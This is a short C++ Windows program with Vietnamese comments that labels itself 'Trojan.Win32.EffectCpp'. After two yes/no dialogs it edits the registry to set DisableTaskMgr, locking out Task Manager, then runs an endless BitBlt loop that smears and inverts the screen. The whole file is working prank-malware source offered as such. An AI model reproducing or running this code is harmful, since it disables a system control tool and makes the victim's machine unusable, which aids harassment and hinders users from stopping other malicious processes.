#include <Windows.h> // Khai báo thư viện Windows.h với C++ API.
#include "HeaderKien.h" // Khai báo thư viện function file "HeaderKien.h".

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// Chạy chương trình SUBSYSTEM:CONSOLE.
	HDC bitblt_hdc = GetDC(0); // Khai báo HDC cho bitblt_hdc.
	int bitblt_a = GetSystemMetrics(0); // Khai báo int cho bitblt_a.
	int bitblt_b = GetSystemMetrics(1); // Khai báo int cho bitblt_b.

	LPCWSTR message1 = L"Do you want to do running virus trojan?."; // Tin nhắn cho hộp thoại message1.
	LPCWSTR title1 = L"Trojan.Win32.EffectCpp"; // Tiêu đề cho hộp thoại title1.

	int result1 = MessageBox(NULL, message1, title1, MB_ICONQUESTION | MB_YESNO); // Hiển thị hộp thoại.

	if (result1 == IDYES) {
		LPCWSTR message2 = L"Last question. Running trojan? Press any key to continue!"; // Tin nhắn cho hộp thoại message2.
		int result2 = MessageBox(NULL, message2, title1, MB_ICONQUESTION | MB_YESNO); // Hiển thị hộp thoại.
		if (result2 == IDYES) {
			MessageBox(NULL, L"Your trojan is running!", title1, MB_ICONERROR | MB_OK); // Hiển thị hộp thoại.
			
			system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\" /v System /t REG_SZ /d \"System\" /f"); // Tạo thư mục System.
			system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f"); // Tạo địa chỉ "DisableTaskMgr" để khóa Trình Quản lý Tác Vụ.

			while (true) {
				// Chạy vòng lặp while.
				BitBlt(bitblt_hdc, 5, 5, bitblt_a, bitblt_b, bitblt_hdc, 0, 0, SRCCOPY); // Chạy hiệu ứng SRCCOPY.
				BitBlt(bitblt_hdc, 5, 5, bitblt_a, bitblt_b, bitblt_hdc, 0, 0, SRCPAINT); // Chạy hiệu ứng SRCPAINT.
				BitBlt(bitblt_hdc, 5, 5, bitblt_a, bitblt_b, bitblt_hdc, 0, 0, SRCINVERT); // Chạy hiệu ứng SRCINVERT.
				
				Sleep(100); // Đông.

			}
		
		}
	
	}
	// Kết thúc chương trình.
}
